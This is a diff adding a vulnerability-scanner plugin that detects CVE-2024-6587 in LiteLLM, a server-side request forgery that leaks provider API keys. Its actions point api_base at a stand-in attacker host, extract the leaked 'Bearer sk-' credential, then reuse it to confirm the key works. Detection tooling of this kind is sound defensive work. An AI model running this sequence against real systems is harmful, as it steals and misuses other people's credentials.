@@ -1,0 +1,133 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+info: {
+  type: VULN_DETECTION
+  name: "LiteLLM_CVE_2024_6587"
+  author: "sanjaymahajan14"
+  version: "1.0"
+}
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2024-6587"
+  }
+  severity: HIGH
+  title: "LiteLLM SSRF and API Key Exposure via api_base Override (CVE-2024-6587)"
+  description: "LiteLLM versions prior to 1.44.9 allow clients to supply an arbitrary api_base parameter in /chat/completions requests. The proxy forwards the request and attaches configured provider credentials in the Authorization header to the target destination, leaking sensitive API keys."
+  recommendation: "Upgrade LiteLLM to version 1.44.9 or later, or disable client-side credential/endpoint overrides."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-6587"
+  }
+}
+config: {}
+
+###########
+# ACTIONS #
+###########
+actions: {
+  name: "fingerprint_litellm"
+  http_request: {
+    method: GET
+    uri: "/health/liveliness"
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          {
+            body: {}
+            contains: "healthy"
+          },
+          {
+            body: {}
+            contains: "I'm alive!"
+          }
+        ]
+      }
+    }
+  }
+}
+actions: {
+  name: "trigger_ssrf_and_extract_key"
+  http_request: {
+    method: POST
+    uri: "/chat/completions"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/json"
+      }
+    ]
+    data: "{\"model\":\"gpt-3.5-turbo\",\"messages\":[{\"role\":\"user\",\"content\":\"test\"}],\"api_base\":\"http://attacker-listener:8080/v1\"}"
+    response: {
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "authorization"
+          },
+          {
+            body: {}
+            contains: "Bearer sk-"
+          }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "['\"]authorization['\"]\\s*:\\s*['\"](Bearer\\s+sk-[^'\"]+)['\"]"
+            variable_name: "leaked_auth_header"
+          }
+        ]
+      }
+    }
+  }
+}
+actions: {
+  name: "validate_leaked_credentials"
+  http_request: {
+    method: GET
+    uri: "/models"
+    headers: [
+      {
+        name: "Authorization"
+        value: "{{leaked_auth_header}}"
+      },
+      {
+        name: "Content-Type"
+        value: "application/json"
+      }
+    ]
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "\"data\":"
+          },
+          {
+            body: {}
+            contains: "\"object\":"
+          }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+workflows: {
+  actions: [
+    "fingerprint_litellm",
+    "trigger_ssrf_and_extract_key",
+    "validate_leaked_credentials"
+  ]
+}
